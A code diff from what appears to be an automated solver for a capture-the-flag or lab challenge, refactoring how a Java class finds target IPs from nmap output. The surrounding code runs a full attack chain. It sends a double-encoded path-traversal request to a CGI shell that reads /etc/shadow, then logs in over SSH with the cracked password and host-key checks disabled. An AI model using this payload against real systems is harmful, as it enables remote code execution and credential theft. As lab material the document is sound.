@@ -112,10 +112,10 @@ public class Solver extends Thread {
 		System.err.println("🛜 Scanning the network");
 		write("nmap -sT " + myIp.replaceAll("\\.\\d+$", ".0/24"));
 		String nmapLines = read(10);
-		// in reality, this would require version detection, but we know mailus is the vulnerable one
-		Matcher matcher = Pattern.compile(".*mailus.*\\((?<ip>.*)\\)").matcher(nmapLines);
-		matcher.find();
-		String mailusIp = matcher.group("ip");
+		// in reality, this would require version detection (nmap -sV for example), but we know mailus is the vulnerable one
+		Matcher mailusMatcher = Pattern.compile(".*mailus.*\\((?<ip>.*)\\)").matcher(nmapLines);
+		mailusMatcher.find();
+		String mailusIp = mailusMatcher.group("ip");
 
 		System.err.println("🚜 Extracting /etc/shadow from mailus");
 		write("curl -Ss 'http://" + mailusIp + "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' -d 'echo; cat /etc/shadow | grep web;'");
@@ -151,8 +151,10 @@ public class Solver extends Thread {
 		}
 		System.err.printf("🔓 Password is %s%n", correctPass);
 
-		// TODO find this out programmatically and use an ip
-		String logusHost = "logus";
+		// again, avoiding time-costly version detection, as we know we are looking for logus
+		Matcher logusMatcher = Pattern.compile(".*logus.*\\((?<ip>.*)\\)").matcher(nmapLines);
+		logusMatcher.find();
+		String logusHost = logusMatcher.group("ip");
 
 		write(String.format("sshpass -p%s ssh -o \"StrictHostKeyChecking no\" -o \"UserKnownHostsFile /dev/null\" web@%s cat /var/log/dashboard/proxy2021-12-09.log", correctPass, logusHost));
 		String logLines = read();
